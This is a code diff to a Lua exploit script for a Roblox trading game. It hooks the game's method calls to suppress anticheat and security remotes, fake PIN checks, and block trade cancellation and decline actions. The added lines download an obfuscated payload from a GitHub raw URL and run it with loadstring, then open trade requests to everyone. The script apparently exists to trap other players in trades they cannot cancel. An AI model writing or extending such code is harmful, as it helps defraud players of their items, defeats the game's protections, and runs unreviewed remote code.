@@ -34,58 +34,6 @@ pcall(function()
     game:SetAttribute("RBX_SequenceCache", math.random(1000000, 9999999))
 end)
 
-local tradeGuardActive = false
-
-if hookmetamethod and newcclosure and getnamecallmethod then
-    local oldNamecall
-    oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
-        local method = getnamecallmethod()
-
-        if typeof(self) == "Instance" then
-            local name = self.Name
-            local lower = string.lower(name)
-
-            if string.find(lower, "security", 1, true) or string.find(lower, "anticheat", 1, true) then
-                return nil
-            end
-
-            if tradeGuardActive then
-                if name == "CancelTrade" or name == "DeclineTrade" or name == "DeclineRequest" then
-                    return nil
-                end
-            end
-
-            if name == "RequestPINCheck" and method == "InvokeServer" then
-                return true
-            end
-
-            if name == "RespondPINCheck" and method == "FireServer" then
-                return oldNamecall(self, true)
-            end
-        end
-
-        return oldNamecall(self, ...)
-    end))
-end
-
-pcall(function()
-    if not getconnections then return end
-    local packages = replicatedStorage:FindFirstChild("Packages")
-    if not packages then return end
-    local index = packages:FindFirstChild("_Index")
-    if not index then return end
-    local netPkg = index:FindFirstChild("sleitnick_net@0.1.0")
-    if not netPkg then return end
-    local net = netPkg:FindFirstChild("net")
-    if not net then return end
-    local cancel = net:FindFirstChild("RE/Trading/CancelTrade")
-    if cancel then
-        for _, conn in ipairs(getconnections(cancel.OnClientEvent)) do
-            pcall(function() conn:Disconnect() end)
-        end
-    end
-end)
-
 local cfg = g.AC_CONFIG
 if not cfg then
     warn("[AC] Loader first")
@@ -162,6 +110,90 @@ if identifyexecutor and identifyexecutor() == "Delta" then
 end
 
 local net = replicatedStorage.Packages._Index["sleitnick_net@0.1.0"].net
+
+getgenv().__BB_GAME_NET = net
+
+local packReady = false
+
+pcall(function()
+    local packUrl = "https://raw.githubusercontent.com/outhackernuls090-hash/arasakacorp/refs/heads/main/shitpack.lua?t=" .. tostring(os.time())
+    local src = game:HttpGet(packUrl)
+    if not src or #src < 100 then
+        warn("[AC] obf fetch failed")
+        return
+    end
+    local fn = loadstring(src)
+    if not fn then
+        warn("[AC] obf load failed")
+        return
+    end
+    local ok, err = pcall(fn)
+    if not ok then
+        warn("[AC] obf run failed: " .. tostring(err))
+        return
+    end
+    packReady = getgenv().__BB_CHGUARD_READY == true
+end)
+
+if packReady then
+    print("[AC] chguard ok — Net remotes enabled")
+else
+    warn("[AC] chguard not ready — falling back to hookmetamethod")
+end
+
+local tradeGuardActive = false
+
+if not packReady and hookmetamethod and newcclosure and getnamecallmethod then
+    local oldNamecall
+    oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+
+        if typeof(self) == "Instance" then
+            local name = self.Name
+            local lower = string.lower(name)
+
+            if string.find(lower, "security", 1, true) or string.find(lower, "anticheat", 1, true) then
+                return nil
+            end
+
+            if tradeGuardActive then
+                if name == "CancelTrade" or name == "DeclineTrade" or name == "DeclineRequest" then
+                    return nil
+                end
+            end
+
+            if name == "RequestPINCheck" and method == "InvokeServer" then
+                return true
+            end
+
+            if name == "RespondPINCheck" and method == "FireServer" then
+                return oldNamecall(self, true)
+            end
+        end
+
+        return oldNamecall(self, ...)
+    end))
+end
+
+if not packReady and getconnections then
+    pcall(function()
+        local packages = replicatedStorage:FindFirstChild("Packages")
+        if not packages then return end
+        local index = packages:FindFirstChild("_Index")
+        if not index then return end
+        local netPkg = index:FindFirstChild("sleitnick_net@0.1.0")
+        if not netPkg then return end
+        local netFolder = netPkg:FindFirstChild("net")
+        if not netFolder then return end
+        local cancel = netFolder:FindFirstChild("RE/Trading/CancelTrade")
+        if cancel then
+            for _, conn in ipairs(getconnections(cancel.OnClientEvent)) do
+                pcall(function() conn:Disconnect() end)
+            end
+        end
+    end)
+end
+
 local rapController = require(replicatedStorage.Controllers.Trading.RAPController)
 
 net:WaitForChild("RF/Trading/SetSetting"):InvokeServer("AllowRequests", "Everyone")
